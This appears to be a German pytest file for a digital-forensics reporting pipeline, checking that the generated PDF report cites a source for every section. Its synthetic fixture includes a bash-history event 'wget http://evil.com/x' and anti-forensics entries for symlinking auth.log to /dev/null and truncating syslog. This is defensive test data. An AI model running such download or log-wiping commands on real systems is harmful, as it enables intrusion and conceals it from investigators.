"""Quellen-Inventur fuer forensischer_analysebericht.pdf.

Kernanforderung des Betreuers: JEDE Information im Bericht muss ihre
Quelle nennen, damit sie nachgeprueft werden kann. Dieser Test prueft,
dass jede Sektion ihre Herkunft (Datei/Partition/Parser/Methode) belegt.
"""
import sys
import tempfile
from pathlib import Path
from datetime import datetime, timezone

sys.path.insert(0, str(Path(__file__).parent.parent))

from models.pipeline_context import PipelineContext
from models.event import ForensicEvent
from models.chain_of_custody import ChainOfCustody
from models.forensic_finding import ForensicFinding
from models.ioc import IOC
from stages.report_modern import build_modern_report

import pytest
pytest.importorskip('pypdf')
pytest.importorskip('reportlab')
from pypdf import PdfReader


def _full_ctx():
    case = Path(tempfile.mkdtemp()) / 'case'
    case.mkdir()
    ctx = PipelineContext(case_dir=case, combined_case=True)
    ctx.coc = ChainOfCustody(file_name='Fall', sha256='', md5='', size_gb=0, start_time=datetime.now())
    ctx.coc.add_evidence('jumpbox.E01', md5='a' * 32, sha1='b' * 40, size_gb=12.4)
    ctx.coc.add_evidence('webserver.E01', md5='c' * 32, sha256='d' * 64, size_gb=38.1)
    ctx.evidence_items = [
        {'name': 'jumpbox.E01', 'os_name': 'Ubuntu 22.04', 'hostname': 'jumpbox',
         'kernel_version': '5.15', 'machine_id': 'a1b2' * 8, 'shadow_mtime': '2024-04-30 10:14 UTC',
         'file_type': 'E01', 'file_size_gb': 12.4, 'timezone_display': 'UTC',
         'partition_layout': [{'index': 2, 'offset': 2048, 'fs_type': 'ext4', 'role': 'ROOT/DATA', 'tool': 'tsk', 'os_name': 'Ubuntu'}],
         'partition_profiles': [{'is_primary': True, 'partition_index': 2, 'offset': 2048, 'os_source': '/etc/os-release'}]},
        {'name': 'webserver.E01', 'os_name': 'CentOS 7', 'hostname': 'web01',
         'kernel_version': '3.10', 'machine_id': '', 'shadow_mtime': '2024-05-01 14:18 UTC',
         'file_type': 'E01', 'file_size_gb': 38.1, 'timezone_display': 'UTC',
         'partition_layout': [{'index': 2, 'offset': 2048, 'fs_type': 'xfs', 'role': 'ROOT/DATA', 'tool': 'tsk', 'os_name': 'CentOS 7'}],
         'partition_profiles': [{'is_primary': True, 'partition_index': 2, 'offset': 2048, 'os_source': '/etc/redhat-release'}]},
    ]
    ctx.normalized_events = [
        ForensicEvent(timestamp=datetime(2024, 5, 1, 14, 2, tzinfo=timezone.utc), source='auth',
                      event_type='ssh', message='Login admin von 10.0.0.9', severity='medium',
                      evidence='jumpbox.E01', orig_path='/var/log/auth.log'),
        ForensicEvent(timestamp=datetime(2024, 5, 1, 14, 5, tzinfo=timezone.utc), source='bash_history',
                      event_type='cmd', message='wget http://evil.com/x', severity='high',
                      evidence='webserver.E01', orig_path='/root/.bash_history'),
    ]
    ctx.forensic_findings = [ForensicFinding(severity='CRITICAL', rule='Lateral Movement', file='/root/x.sh',
                             description='SSH-Login gefolgt von Download.',
                             anomaly_time=datetime(2024, 5, 1, 14, 5, tzinfo=timezone.utc),
                             evidence=[{'evidence': 'webserver.E01', 'orig_path': '/root/.bash_history'}])]
    ctx.iocs = [IOC(type='url', value='http://evil.com/x', source='bash_history', context='wget'),
                IOC(type='ip', value='8.8.8.8', source='auth', context='dns')]
    ctx.antiforensics_hits = [
        {'type': 'devnull_symlink', 'file': '/var/log/auth.log', 'details': 'auth.log -> /dev/null', 'severity': 'critical', 'source': 'fls_symlink_scan'},
        {'type': 'log_deletion', 'file': '/var/log/syslog', 'details': '> /var/log/syslog', 'severity': 'high', 'source': 'rc_local'}]
    ctx.parser_stats = {'mactime': 142038, 'auth': 169, 'wtmpdb': 58}
    ctx.parsed_events = 214508
    ctx.stage_status = {'quality': 'SEHR GUT'}
    build_modern_report(ctx, case)
    return '\n'.join(p.extract_text() for p in PdfReader(str(case / 'forensischer_analysebericht.pdf')).pages)


def test_jede_sektion_belegt_quelle():
    txt = _full_ctx()
    assert 'PROVENIENZ' in txt and 'img_stat' in txt          # 02 Hashes
    assert '/etc/os-release' in txt and '/etc/redhat-release' in txt  # 03 OS-Quelle
    assert 'istat' in txt                                     # 03 Shadow
    assert '/root/x.sh' in txt                                # 04 Befund-Datei
    assert 'webserver.E01' in txt                             # 04 Image-Kontext
    assert 'fls_symlink_scan' in txt and 'rc_local' in txt    # 04 AF Nachweis-Quelle
    assert '/var/log/auth.log' in txt                         # 05 Timeline orig_path
    assert 'bash_history' in txt                              # 06 IOC Parser-Quelle
